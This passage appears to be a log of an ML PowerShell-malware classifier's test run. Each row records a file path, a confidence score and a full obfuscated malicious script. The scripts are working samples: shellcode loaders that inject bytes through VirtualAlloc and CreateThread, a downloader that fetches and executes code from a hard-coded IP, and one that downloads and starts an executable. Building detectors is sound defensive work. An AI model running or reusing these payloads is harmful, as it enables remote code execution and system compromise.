{wTIw::memset([IntPtr](wTIx.ToInt32',',0x54,0x50,0x68,0x29,0x80,0x6b,0x','()+wTIi), wTIz[wTIi], 1)};wTIw::CreateThread(0,','xd5,0x93,0x53,0x6a,0x00,0x56,0x53,0x57,0x','0,wTIx,0,0,0);for (;;){Start-sleep 60};','0xff,0x4e,0x08,0x75,0xec,0x68,0xf0,0xb5,0xa2,0x56,0xff,0xd5,0x6a,0x00,0x6a,0x04,0x56,0x57,','0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,0xe0,0x','a,0x68,0x02,0x00,0x11,0x5c,0x89,0xe6,0x','ess, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(Ienkernel32.dllIen)]public static extern IntPtr Creat','wTIc = 8mZ[DllImpo','0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x8b',',0xd0,0x89,0x44,0x24,0x24,',',0x8b,0x58,0x20,0x01,0xd3,0xe3,0x3c,0x49,0x','0xc7,0xe2,0xf0,','x51,0x')) -CrepLAcE  '8mZ',[chaR]39 -REpLacE'wTI',[chaR]36  -CrepLAcE([chaR]73+[chaR]101+[chaR]110),[chaR]34) |.((gv '*MDR*').nAME[3,11,2]-JoiN'')",malicious,TP
2026-07-13 16:39:34,C:\\TA\\project-ta\\data_spliting\\test_set_obf\\String_Reordering\\malicious\\1208.ps1,custom-ps-ml,UNKNOWN,39479b71-f720-426e-a69a-b47026e97546,DESKTOP-BAC9DBQ,malicious,0.9891,RandomForest,1463,1531.75,".( $VErBOSEprefEREnCE.TOSTring()[1,3]+'x'-JOIn'')( ((\""{43}{10}{13}{40}{84}{87}{9}{60}{28}{76}{70}{68}{6}{35}{46}{71}{86}{18}{55}{31}{30}{54}{41}{90}{88}{11}{75}{51}{1}{34}{4}{66}{8}{15}{67}{79}{32}{39}{14}{81}{33}{29}{37}{50}{21}{5}{20}{89}{52}{45}{57}{73}{78}{44}{16}{22}{85}{38}{65}{49}{64}{26}{61}{72}{12}{80}{3}{27}{58}{25}{63}{77}{7}{24}{2}{59}{56}{19}{48}{17}{69}{82}{74}{42}{0}{23}{36}{53}{83}{47}{62}\"" -f 'T',' =','Mbht','([cHaR[]](','s','yST','6.1; WO','(','NET.We','la','C=NeW-','AgentL','I=0;[cHar','OBJEcT SYstem.NEt.W','ul','bREQuEST','KCR','b)))cYV%{w9M_-BXOr','.0) like Ge',':5552','e','[S','eD','H]};IEX (','G','.D','DOGm4','w','.','wc.PRo','Mw','Q;w9',':DE','EbProxY;w9M',' [SY','W64; Tr','w9Mb-JO','xy','ls;','Fa','ebCL','eRS.Add(LW','Mk.LEng','w9Mw','Or','CAc','ident/7.','LW','/index.aspGM','7L^w9M89kQYJ','.CrEDEnTIaLS = ','PROXY','al','iNLW','C.HeAd','ckoLW','552','HE]:','9Mwc','tp://41.230.232.65:5','/5','?1p:BX;P0,L','Q)','OWNLOA','WVefHK','w9MK=LWQA}&gt;','tEm.',']',' NT ','w9Mk[w9M',' (Windows','0; ','WQ;w9M',':DEfauLtNE','%w9','WQ,w9Mu);w9MwC.','0','dSTrInG','TW',':','[]]w9MB=','tW','I++','Q','iEnT;w9Mu=LW','ENTia','rv:11','QMozil','User-','M.NeT.CRedENTi','Q')).RePLace(([chaR]99+[chaR]89+[chaR]86),[StRINg][chaR]124).RePLace(([chaR]119+[chaR]57+[chaR]77),[StRINg][chaR]36).RePLace(([chaR]71+[chaR]77+[chaR]98),[StRINg][chaR]34).RePLace(([chaR]81+[chaR]89+[chaR]74),'`').RePLace(([chaR]76+[chaR]87+[chaR]81),[StRINg][chaR]39) )",malicious,TP
2026-07-13 16:39:50,C:\\TA\\project-ta\\data_spliting\\test_set_obf\\String_Reordering\\malicious\\124.ps1,custom-ps-ml,UNKNOWN,2857623b-b71b-4057-8443-0c5b37125451,DESKTOP-BAC9DBQ,malicious,0.8793,RandomForest,444,4082.41,"Invoke-expReSSION(((\""{11}{10}{7}{8}{9}{18}{3}{15}{35}{14}{31}{0}{36}{6}{17}{16}{20}{34}{28}{1}{21}{5}{19}{26}{25}{32}{13}{29}{23}{24}{33}{30}{27}{4}{22}{2}{12}\"" -f 'oa','ich','b.exe','b','ss tZpf','om','e','ject Syst','em.','Ne','Ob','(New-','tZp','6hj','t)','Clie','ph','(tZ','t.We','/?v','t','ier.c','lee','p,','tZpflee','g7','8w3','art-Proce','1f','tZ','tZp);St','.Downl','3','b.exe','tps://','n','dFil')).RePlAce('tZp',[striNG][ChAR]39) )",malicious,TP
2026-07-13 16:40:11,C:\\TA\\project-ta\\data_spliting\\test_set_obf\\String_Reordering\\malicious\\1241.ps1,custom-ps-ml,UNKNOWN,e7ac9544-43e8-4246-aa60-fbdbb991e6d9,DESKTOP-BAC9DBQ,malicious,1.0,RandomForest,2953,1721.95,"&amp;( $ShelliD[1]+$SHellid[13]+'x') (((\""{40}{63}{20}{67}{21}{46}{65}{64}{1}{39}{19}{48}{13}{56}{31}{26}{44}{61}{30}{14}{34}{38}{47}{9}{22}{17}{4}{52}{69}{3}{66}{57}{43}{50}{28}{37}{58}{6}{62}{23}{53}{35}{12}{49}{11}{25}{51}{42}{68}{2}{27}{16}{59}{29}{36}{54}{8}{32}{15}{24}{5}{0}{41}{7}{10}{18}{60}{33}{55}{45}\""-f' 0x1000;if (EPGz.Lengt','t cou','0xe0,0xff,0xd5,0x97,0x6a,0x05,0x','b,0x4','xc1,0xcf,0x0d,0x01,0xc7,','5,0x01,0xc3,0x29,0xc6,0x85,0xf6,0x75,0xec,0xc3;EPGg =','24,0x75,0xe2,0x58,0x8b,0x58,0x24,0',' EPGz.Length};EPGx=EPGw::','0,0x00,0x00,0x56,0x6a,0x00,0x68,0x58,0xa4,0x53,0xe5,0xff,0xd5,0x93,0','0,0','VirtualAlloc(0,',',0x5f,0x5a,0x8b,0x12,0xeb,0x86,0x5d,0x68,0x33,0x32,0x00,0x00,0x68,0x77,0x73,0x32,0x5','0x61,0x59,0x5a,0','Fu','d2,0x64,0x8','3,0x6a,0x00,0x56,0x53,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xf',',0x68,0x02,0x00,0x01,0xbd,0x89,0xe6,0x6a,0x10,0x56,0x57,0x68,0x99,0xa5,0x74,0','52,0x0c,0x8b,0x52,0x14,0x8b,0x72,0x28,0x0f,0xb7,0x4a,0x26,0x31,0xff,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0','0x1000,EPGg,0x40);for (EPGi=0;EPGi -l','3gF;EPGw = Add-Type -memberDefinition EP',')]public sta','tAddress, IntPtr lpPar','x8b,0x','0x01,0xd3,0x8b,0x04,0x8b,0x','f,0xd','f,0x','0x','68,0xc0,0xa8,0x01,0x92','x50,0x8b,0x48,0x18,0x8b,0x58,0x20,0x01,0xd3,0xe3,0x3c,0x49,0x8b,0x34,0x8b,0x01,0xd6,0x31,0xff,0x31,0xc0,0xac,0xc1,0xcf,0x','a2,0x56,0xff,0xd5,0x6a,0x00,0x6a,0x04,0x56,0x57,0x','31,0x','sthru;[Byte[]];[Byte[]]EPGz = ','x5','.ToInt32()+EPGi), EPGz[EPGi], 1)};EPGw::CreateThread(0','b,0x','4,0x24,0x5b,0x5b,','68','0d,0x01','52,','nt);','EPGc = 3gF[DllImport(Nb7kernel32.dllNb7)]public static extern IntPtr Virtu','h -gt 0x1000){EPGg =','90,0x01,0x00,0x00,0x29,0xc4','x01','fc,0x','rt-sleep 60};','ameter, uint dwCreationF','0x3','Gc -Name Nb7Win32Nb7 -namespace Win32','x51,0xff,0xe0,0x58',',0xd0,0','54,0x68,0x4c,0x77,0x26,0x07,0xff,0xd5,0xb8,0x','0xe2,0xf0,0x52,0x57,0x8b,0x52,0x1','01,0xd0,0x89,0x44,0x2',',0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x8b,0x36,0x6a,0x40,0x68,0x00,0x1',',0,EPGx,0,0,0);for (;;){Sta','nctions -pas','0x78,0x85,0xc0,0x74,0x4a,0',',0xc7,0x38,0xe0,0x75,0xf4,0x03,0x7d,0xf8,0x3b,0x7d,0x','x61,0xff,0xd5,0x85,0xc0,0x74,0x0c,0xff,0x4e,0x08,0x75,0xec,0x68,0xf0,0xb5,0x','e (EPGz.Length-1);EPGi++) {EPGw::memset([IntPtr](EPGx','e8,0x89,0x00,0x00,0x00,0x60,0x89,0xe5,0x','x01,0xd3,0x66,0x8b,0x0c,0x4b,0x8b,0x58,0x1c,','alAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(Nb7kernel32.dllNb7',' IntPtr memset(IntPtr dest, uint src, uin','lags, IntPtr lpThreadId);[DllImport(Nb7msvcrt.dllNb7)]public static extern','0,','tic extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStar',',0x54,0x50,0x68,0x29,0x80,0x6b,0x00,0xff,0xd5,0x50,0x50,0x50,0x50,0x40,0x50,0x40,0x50,0x68,0xea,0x0f,0xdf,','0,0x8b,0x42,0x3c,0x01,0xd0,0x8')).rEplAcE(([CHar]78+[CHar]98+[CHar]55),[stRINg][CHar]34).rEplAcE('3gF',[stRINg][CHar]39).rEplAcE(([CHar]69+[CHar]80+[CHar]71),'$') )",malicious,TP
2026-07-13 16:40:25,C:\\TA\\project-ta\\data_spliting\\test_set_obf\\String_Reordering\\malicious\\1248.ps1,custom-ps-ml,UNKNOWN,6475b03b-d6ad-4b96-b35f-67788f3c354c,DESKTOP-BAC9DBQ,malicious,1.0,RandomForest,2828,1612.88," ((\""{12}{29}{37}{7}{46}{5}{24}{1}{15}{23}{33}{39}{20}{38}{21}{10}{44}{36}{22}{32}{34}{27}{17}{13}{9}{2}{45}{4}{18}{28}{31}{30}{40}{3}{19}{14}{43}{11}{16}{0}{6}{35}{41}{25}{42}{26}{8}\"" -f'x40,0x68,0x00,0x10,0x00,0x00,0x56,0x6a,0x00,0x68,0','atic extern IntPtr',',0xff,0xe0,0x58,0x5f,0x5a,0x8b,0x12,0xeb,0x86,0x5d,0x68,0x33,0x32,0x0','c0,0x74,0x0c,0xff,0x4e,0x0','32,0x5f,0x54,0x68,0x4c,0x77,0x26,0x07,0xff,0','int flAllocationType, uint flProtect);[DllImport(IQskernel32.dllIQs)]public','x58,0xa4,0x53,0xe5,0xff,0x',' VirtualAlloc(IntPtr lpAddress, u','lAlloc(0,0x1000,P9kg,0x40);for (P9ki=0;P9ki -le (P9kz.Length-1);P9ki++) {P9kw::memset([IntPtr](P9kx.ToInt32()+P9ki), P9kz[P9ki], 1)};P9kw::CreateThread(0,0,P9kx,0,0,0);for (;;){Start-sleep 60};','0x59,0x5a,0x51','89,0xe5,0x31,0xd2,0x64,0x8b,0x52,0x30,0x8b,0x52,0x0c,0x8b,0x52,0x14,0x8b,0x72,0x28,0','6,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x8b,0x36,0x6a,','P9kc = jsU[DllImport(IQs','x44,0x24,0x24,0x5b,0x5b,0x61,',',',' CreateThread(IntPtr lpThread','0','x8b,0x04,0x8b,0x01,0xd0,0x89,0','xd5,0xb8,0x90,0x01,0x00,0x00,0x29,0xc4,0x54,0x50,0x','8,0x75,0xec,0x68,0xf0','2Functions -passthru;[Byte[]];[Byte[]]P9k','xe8,0x89,0x00,0x00,0x00,0x60,0x','0x01,0xc7,0xe2,0xf0,0x52,0x57,0x8b,0x52,0x10,0x8b,0x42,0x3c,0x01,0xd','Attributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport(IQsmsvcrt.dllIQs)]public static extern IntPtr memset(IntPtr dest, uint src, uint count);jsU;P9kw ',' st','x56,0x53,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x01,0xc3,0x29,0xc6,0x85,0xf6,0x75,0xec,0xc3;P9kg = 0x1000;if (P9kz.Le','th};P9kx=P9kw::Virtua',',0x58,0x1c,0x01,0xd3,0','68,0x29,0x80,0x6b,0x00,0xff,0xd5,0x50,0x50,0x50,0x50,0x40,0x50,0x40,0x50,0x68,0xea,0x0f,0xdf,0xe0,0xff,0xd5,0x97,0x6a,0x05,0x68,0xc0,0xa8,0x01,0','kernel32.dllIQs)]public static ex','x74,0x6','x11,0x68,0x02,0x00,0x01,0xbb,0x89,0xe6,0x6a,0x10,0x56,0x57,0x68,0x99,0xa5,0','0,0x8b,0x40,0x78,0x85,0xc0,0x74,0x4a,0x01,0xd0,0x50,0x8b,0x48,0x18,0x8b,0x58,0x20,0x01,0xd3,0xe3,0x3c,0x49,0x8b,0x34,0x8b,0x01,0xd6,0x31,0xff,0x31,0xc0,0xac,0xc1,0xcf,0x0d,0x01,0xc7,0x38,0xe0,0x75,0xf4,0x03,0x7d,0xf8,0x3b,0x7d,0x24,0x7','= Add-Type -memberDefinition P9kc -Name IQsWin32I','5,0xe2,0x58,0x8b,0x58,0x24,0x01,0xd3,0x66,0x8b,0x0c,0x4b,0x8b','d5,0x93,','cf,0x0d,','tern IntPtr','z = 0xfc,0','Qs -namespace Win3','1,0xff,0xd5,0x85,0x','0x53,0x6a,0x00,0','ngth -gt 0x1000){P9kg = P9kz.Leng','0xb5,0xa2,0x56,0xff,0xd5,0x6a,0x00,0x6a,0x04,0x5','x0f,0xb7,0x4a,0x26,0x31,0xff,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0x','0,0x00,0x68,0x77,0x73,0x','int dwSize, u')).RePLACE(([cHAr]73+[cHAr]81+[cHAr]115),[StRiNG][cHAr]34).RePLACE(([cHAr]80+[cHAr]57+[cHAr]107),[StRiNG][cHAr]36).RePLACE(([cHAr]106+[cHAr]115+[cHAr]85),[StRiNG][cHAr]39) |.( $ShellId[1]+$sHeLLiD[13]+'x')",malicious,TP
2026-07-13 16:40:30,C:\\TA\\project-ta\\data_spliting\\test_set_obf\\String_Reordering\\malicious\\1249.ps1,custom-ps-ml,UNKNOWN,cd334f41-ea24-4210-a8d4-e5ede686ff15,DESKTOP-BAC9DBQ,malicious,1.0,RandomForest,2959,1809.31,"iEx( ((\""{36}{48}{12}{42}{22}{16}{47}{61}{24}{30}{35}{6}{67}{38}{46}{41}{64}{11}{45}{62}{17}{7}{56}{3}{21}{34}{53}{60}{23}{8}{59}{65}{44}{10}{28}{51}{26}{58}{52}{25}{19}{15}{29}{54}{43}{1}{33}{32}{13}{63}{20}{49}{50}{68}{31}{37}{66}{39}{18}{2}{55}{40}{57}{4}{5}{9}{14}{27}{0}{69}\""-f'oInt32()+Sfdi), Sfdz[Sfdi], 1)};Sfdw::CreateThread(',',0x68,0xea,0x0f,0xdf,0xe0,0xff,0xd5,0x97,0x6a,0x','d5,0x01,0xc3,0x29,','c7','Length -gt 0x1000){Sfdg = Sfdz.Length};Sfdx=Sfdw::VirtualAlloc(0,0x1000,Sfdg,','0x40);for (Sfdi=0','r lpThreadId);[DllImport(tHmmsvcrt.dlltHm)]public static extern IntPtr m','0xff,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,','6,0x31,0xff,0x31,0xc0,0xac,0x',';Sfdi -le ',',0x3b,0x7d,0x24,0x75,0xe',',0x00,0x60,0x89,0xe5,0x31,0xd2,0x64,0x8b,0x52,0x30,0x8b,0x52,0x','loc(IntPtr lpAddress, uint dwSize, uint flAlloca',',0x02,','(Sfdz.Length-1);Sfdi++) {Sfdw::memset([In','80,0x6b,0x00,0x','lltHm)]public static ex','0x4a,0x26,0x31,','36,0x6a,0x40,0x68,0x00,0x10,0x00,0x00,0x56,0x6a,0x00,0x68,0x58,0xa4,0x53,0xe5,0xff,0xd5,0x93,0x53,0x6a,0x00,0x56,0x53,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0x','x29,0xc4,0x54,0x50,0x68,0x29,0x',',0xe6,0x6a,0x10,0x56,0x57,0x68,0x99,0xa5,0x74,0x61,0xf',',0xe2,0xf0,0x52,0x57,0','2.d',',0x50,0x8b,0x48,0x18,0x8b,0x58,0x20,0x01,0xd3,0xe3,0x3c,0x49,0x8b,0x34,0x8b,0x01,0xd','wStackSize, IntPtr lpS','7,0x73,0x32,0x5f,0x54,0x68,0x4c,0x77,0x26,0x07,0xff,0xd5,0xb8,0x90,0x01,0x00,0x00,0','x44,0x24,0x24,0x5b,0x5b,0','tPtr](Sfdx.T','2,0x58,0x8b,0x58,0x24,0x01,0xd3,0x66,0','ff,0x','tartAd','d5,0x6a,0x00,0x6a,0x0','68,0xc0,0xa8,0x64,0x04,0x68','05,0x','x8b,0x52,0x10,0x8b,0x42,','dress, IntPtr lpParameter, uint dwCreationFlags, IntPt','Sfdc = 3E8[DllImport(tHmkernel32.dlltHm)]public static e','4,0x56,0x57,0x68,0x02,0xd9,0xc8,0x5f,0',';Sfdw = Add-Type -memberDefinition Sfdc -Name ','ff,0xd5,0x8b,0x','85,0xf6,0x75,0xec,0xc3;Sfdg = 0x10','32Functions -passthru;[Byte[]];[Byte[]]Sfdz = 0xfc,0x','tionType, uint flProtect);[DllImport(tHmkernel3','50,0x40,0x50','0xf8','0c,0x8b,0x52,0x14,0x8b,0x72,0x28,0x0f','tHmWin32tHm -namespace Win','tern IntPtr CreateThread(IntPtr lpThreadAttributes, uint','xtern IntPtr VirtualAl','f,0xd5,0x85,0xc0,0x74,0x0c,0xff,0x4e,0x08,0x75,0xec,0x68,0xf0,0xb5,0xa2,0x56,','0','x8b,0x0c,0x4b,0x8b,0x58,0x1c,0x01,0xd3,0x8b,0x04,0x8b,0x01,0xd0,0x89,0',',0xeb,0x86,0x5d,0x68,0x33,0x32,0x00,0x00,0x68,0x7','0x3c,0x01,0xd0,0x8b,0x40,0x78,0x85,0xc','d5,0x50,0x50,0x50,0x50,0x40,0x','0xc6,0x','0xcf,0x0d,0x01,0x','00;if (Sfdz.','x61,0x59,0x5a,0x51,0xff,0xe0,0x58,0x5f,0x5a,0x8b,0x12','c1,0xcf,0x0d,0x01,0xc7,0x38','0,0x74,0x4a,0x01,0xd0',' d',',0xb7,','0x00,0x01,0xbb,0x89','e8,0x89,0x00,0x00',',0xe0,0x75,0xf4,0x03,0x7d,','x','emset(IntPtr dest, uint src, uint count);3E8','xff,0x','0,0,Sfdx,0,0,0);for (;;){Start-sleep 60};')).RePlace(([ChAr]83+[ChAr]102+[ChAr]100),[strING][ChAr]36).RePlace(([ChAr]116+[ChAr]72+[ChAr]109),[strING][ChAr]34).RePlace(([ChAr]51+[ChAr]69+[ChAr]56),[strING][ChAr]39))",malicious,TP
2026-07-13 16:40:33,C:\\TA\\project-ta\\data_spliting\\test_set_obf\\String_Reordering\\malicious\\128.ps1,custom-ps-ml,UNKNOWN,c147209d-edc1-4765-8b4e-8c2d280291b8,DESKTOP-BAC9DBQ,malicious,0.9697,RandomForest,2798,1555.78," &amp; ((GET-VARIAbLE '*mdr*').NaMe[3,11,2]-JOiN'') ((((\""{7}{18}{25}{40}{9}{30}{16}{13}{45}{24}{17}{12}{21}{19}{41}{1}{29}{4}{26}{14}{38}{33}{11}{36}{43}{22}{42}{23}{34}{37}{35}{5}{28}{0}{32}{3}{15}{39}{44}{2}{27}{20}{10}{6}{46}{31}{8}\""-f '10,0x00,0x00,0x56,0x6a,0x00,0x68,0x58,0xa4,0x5','uint','= BiWSz.Len','5,0xff,0xd5,0x93,0x53,0x6a,0x','1,0xc0,0xac,0x3c,0x61,0x7c,0x0','ec,0x68,0xf0,0xb5,0xa2,0x56,0xff,0xd5,0x6a,0x00,0x6a,0x04,0x56,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5','t32()+BiWSi), BiWSz[BiWSi], 1)};BiWS','BiWSc = 0sI[DllImp',' 60};','ress, uint dwSize, uint flAll','{BiWSw::memset([IntPtr](BiWSx.ToIn',',0xff,',' lpThreadI','2)]public static extern IntPtr CreateThread(IntP','0x2c,0x20,0xc1,0xcf,0x0d,0x01,0xc7,0xe2,0xf0,0x52,0x57,0x8b,0x52,0x10,0x8b,0x42,0x3c,0x01,0xd0,0x8b,0x40,0x78,0x85,0xc0,0x74,0x4a,0x01,0xd0,0x50,0x8b,0x4','00,0x56,0x53,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x01,0xc3,',';[DllImport(W92kernel32.dllW9','ntPtr','ort(W92kernel32.dllW92)]public static extern IntPtr VirtualAl','ntPtr memset(IntPtr dest, uint sr','BiWSi++) ','d);[DllImport(W92msvcrt.dllW92)]public static extern I','b,0x58,0x24,0x01,0xd3,0x66,0x8b,0x0c,0x4b,0x8b,0x58,','xd3,0x8b,0x04,0x8b,0x01,0xd0,0x89,0x44,0x24,0x24,0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,0xe0,0x58,0x5f,0x5a,0x8b,0x12,0xeb,0x86,0x5d,0x68,0x33,0x32,0x00,0x00,0x68,0x77,0x73,0x32,0x5f,0x54,0x68,0x4c,0x77,0x26,0x07,0xff,0xd5,0xb8,0x90,0x01,0x00,0x00,0x29,0xc4,0x54,0x50,0x68,0x29,0x80,0x6b,0x00,0xff,0xd5,0x50,0x50,0x50,0x50,0x40,0x50,0x40,0x50,0x68,0','dwCreationFlags, I','loc(IntPtr l','2,','gth};BiWSx=BiWSw::VirtualAlloc(0,0x1000,BiWSg,0x40);for (BiWSi=0;BiWSi -le (BiWSz.Length-1);',',0x8b,0x36,0x6a,0x40,0x68,0x00,0x',' count);0sI;BiWSw = Add-Type -memberDefinition BiWSc -Name W92Win32W92 -namespace Win32Functions -passthru;[Byte[]];[Byte[]]BiWSz = 0xfc,0xe8,0x89,0x00,0x00,0x00,0x60,0x89,0xe5,0x31,0xd2,0x64,0x8b,0x52,0x30,0x8b,0x52,0x0c,0x8b,0x52,0x14,0x8b,0x72,0x28,0x0f,0xb7,0x4a,0x26,0x31,0xff,0x3','ocationType, uint flProtect)',';){Start-sleep','3,0xe','x20,0x01,0xd3,0xe3,0x3c,0x49,0x8b,0x34,0x8b,0x01,0xd6,0x31','xea,0x0f,0xdf,0xe0,0xff,0xd5,0x97,0x6a,0x05,0x68,0x80,0x48,0x1c,0xd0,0x68,0x02,0x00,0x01,0xbb,0x','0xe6,0x6a,0x10,0x56,0x57,0x68,0x99,0xa5,0x74,0x61,0xff,0xd5,0x85,0xc0,0x74,0x0c,0xff,0x4e,0x08,0x75,0x','0x31,0xc0,0xac,0xc1,0xcf,0x0d,0x01,0xc7,0x38,0xe0','89,','8,0x18,0x8b,0x58,0','0x29,0xc6,0x85,0xf6,0x75,0xec,0xc3;BiWSg = 0x1000;if (BiWSz.Length -gt 0x','pAdd','c, ','0x1c,0x01,0',',0x75,0xf4,0x03,0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe2,0x58,0x8','1000){BiWSg ','tr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint ','w::CreateThread(0,0,BiWSx,0,0,0);for (;')) -REplACe'BiWS',[CHar]36 -REplACe([CHar]48+[CHar]115+[CHar]73),[CHar]39 -CRepLaCE 'W92',[CHar]34))",malicious,TP
2026-07-13 16:40:45,C:\\TA\\project-ta\\data_spliting\\test_set_obf\\String_Reordering\\malicious\\1282.ps1,custom-ps-ml,UNKNOWN,ed8355a7-d4cf-42b8-ae9c-50f68813be7f,DESKTOP-BAC9DBQ,malicious,1.0,RandomForest,3442,1758.78," ((\""{8}{67}{57}{76}{44}{25}{82}{20}{75}{11}{34}{4}{14}{13}{32}{12}{45}{37}{27}{38}{49}{42}{60}{69}{40}{59}{31}{54}{72}{18}{0}{39}{71}{63}{6}{15}{70}{56}{74}{3}{24}{62}{78}{48}{46}{35}{43}{81}{64}{73}{22}{65}{77}{5}{61}{17}{29}{53}{30}{10}{58}{7}{36}{19}{41}{79}{28}{21}{9}{23}{26}{16}{66}{33}{47}{1}{52}{55}{50}{80}{68}{2}{51}\""-f '0xe2,0x32,0x20,0x8e,0x1f,0xbe,0','ngth','jh8i), jh8z[jh8i], 1)};jh8w::CreateThread(0,','7c,0x50,0xe0,','k)]pu','7,0xfe,0x9c,0xdd,0x68,0xd4,0x77,0x','x35,0x47,0xc0,0xa9',',0xcd,0x7a,0x17,','jh8ZAl5 = 9xu[DllImport(Snkkernel32.',',0x0e,0x1b,0x99,0x9b,0xd1,0xf6,0x1c,0x9b,0x5a,0x34,0x95,0x1b,0xa2,0x05,0x2c,','x9f,0x22,0x6a,0x97,0','tr lpStartAddress, IntPtr lpParameter, ','space Win32Functio','lic static extern IntPtr memset(IntPtr dest, uint src, uint count);9xu;j','b',',0x7c,0x5f,0x05,0x97,0x37,0xd4,0xfd,0x63,0xc6,0x3c,0xcc,0x8c,0x64,0x01,0xe0,0x7e,0x75,0x45,0xc7,0x60,0x00,0xbf,0x3b,0x1c,0x12,0x04,0x41,0xfa,0x97,0x9f,0xe1,0x89,0x0f','x5c,0x7d,0x99,0xf8,0xcf,0xec,0x3c,0xd0,0x7a,0x9f,0x90,0x4e,0xe5,','5,0xd9,0xbe,0xb2,0x8d,0x68,0x87,0xa4,0xc8,0x6d,0xd2,0x8a,0x87,0xc2,0x8e,0x7a,0x40,0xc9,0x36,0x9b',',0x21,0x49,','0xa5,0x7a,0x17,0x88,0x35,0x29,0x7f,0x50,0x92,0x9e,0x9a,0x9f,0x0f,0xb3,0x36,0x33,','hread(IntPtr lpThreadA','78','x66,0x37,0x98,0xb0,0xda,0xe4,0x34,0x14,0xd3,0x0a,0xc4,0xb2,0x60,0x0a,0xc4,0x42,0x56,0x4f,0x83,0x0a,0x91,0x1f,0x0b,0xdb,0x89,0xc8,0x82,0','0xe3,0xd1,0x6c','0x91,0x27,0x','(Snkkernel32',',0x76,0x27,0x46,0x87,0xf3,0x58,0x86,0xa8,0x8c,0xd1,0x0e,0x64,0','ru;[Byte[]];[Byte[]]jh8z = 0','1c,0x69,0xec,0x',',0xeb,0xee,0xe2,0x','f4,0xfc,0xd6,0','xaa,0xb1,0xbe,0x65,0x5f,0x41,0xb2,0xa1,0x50,0xe2,0x79,0x97','h8w = Add-Type -memberDefinition jh8ZAl5 -Name SnkWin32Snk -name','2b,0x88,0x8e;jh8g = 0','uint dwCreationFlags, IntPtr lpThreadId);[DllImport(Snkmsvcrt.dllSn','9,0x35,0x23,0xef,0x81,0x85,','0xc8,','th','xdb,0xce,0xd9,0x74,0x24,0xf4,0x5e,0','x70,0x4',',0x62,0x0a,0x85,0x2c,0xe6,0x3d,0x35,0x','0x39,0x54,0xef','0xca,0x8a,0x52,0x62,0x33,0xc9,0xb1,0x58,0x31,0x6e,0x1a,0x83,0xee,0xfc,0x03,0x6e,0x16','0xc4,0x29,','uint flProtect);[DllImport','ns -pass','ba,0x7f,0x5b,0x8a,0x33,0xe','x1000;if (jh8z.Le',',0x','xbd,','Alloc(0,0x1000,jh8g,0x40);for (jh8i=0;jh8i -le (jh8','0,jh8bVz,0,0,0);for (;;){Start-sleep 60};',' -gt 0x1000){jh8g = jh8z.Length};jh8b','1e,0xcb,0x65,0x07,0x6e,0xb9,0x5c,0x7f,0x80,0x',',0x5f,0xf3,0xd2,0xeb,0xf','Vz=jh8w::Virtual','f,0x2a,0x9e,0x48,0x3c,0xad,0x73,0xe3,0x38,0x',' static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAlloca','x37','27,0',',0xe2,0x3f,0x76,0xba,0xe0,0xbf,0x87,0x3b,0x85,0x','4b,0x9c,0x88,0x1f,0x0c,0x93,0x36,0xe0,0x85,0x33,0x5c,0xe4,0xc','f9','x77,0xc6,0x95,0xa5,0x0c,0x91,0','0x52,0x35,0x67,0x3a,0x','x44,0x8f,0x08,0x41,0xf3,0xd6,0xa4,0x01,0x04,0xe5,0xaa,0x55,0x57,0x5a,0x78,0x02,','0x','dllSnk)]public',' {jh8w::memset([IntPtr](jh8bVz.ToInt32()+','36',',0x44,0x13,0x5d,0xc9,0x0f,0x1','7,0x6b,0x6c,0x65,0xec,0x21,0xac,0x0e,0xbe,0xa4,0xb4,0xf3,0','e,0x77,0x29,0x3f','3c,0x83,0xd1,0xc5,0x1b,0x0c,0x08,0','26,0x72,0x24,0xc9,0x','ttributes, uint dwStackSize, IntP','tionType, ','0x0b,0x0a,0x16,0x4',',0xb1,0x7f,0x89,0x06,0xa1,0xdf,0x76,0xa2,0xa9,0xf2,0x63,0xdf,0xf3,0x9a,0x1d',',0xdb,0x39,0xba,0x10,0x','z.Length-1);jh8i++)','0x55,0xe9,0xfe,0x04,0x82,0x46,','.dllSnk)]public static extern IntPtr CreateT')).REplAcE('jh8','$').REplAcE('Snk',[StRing][CHAR]34).REplAcE(([CHAR]57+[CHAR]120+[CHAR]117),[StRing][CHAR]39)| Iex",malicious,TP
2026-07-13 16:40:51,C:\\TA\\project-ta\\data_spliting\\test_set_obf\\String_Reordering\\malicious\\1283.ps1,custom-ps-ml,UNKNOWN,b5053e8d-c709-45b2-bdfd-c199ec59e372,DESKTOP-BAC9DBQ,malicious,0.8352,RandomForest,2950,2380.93," &amp; ((gV '*mdr*').namE[3,11,2]-jOin'')((((\""{22}{39}{1}{34}{31}{3}{9}{2}{4}{16}{43}{26}{5}{46}{12}{28}{49}{25}{40}{11}{37}{32}{41}{14}{6}{36}{17}{48}{38}{0}{13}{19}{20}{35}{18}{15}{8}{42}{30}{29}{27}{44}{10}{7}{33}{23}{21}{24}{45}{47}\""-f'e,0xd8,0xdf,0x87,0x','mport(oilkernel32.dlloil)]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, ui','ntPtr lpThreadA','c static e','ttributes, uint dwStackSize, IntPtr lpSta','r memset(IntPtr dest, uint src, 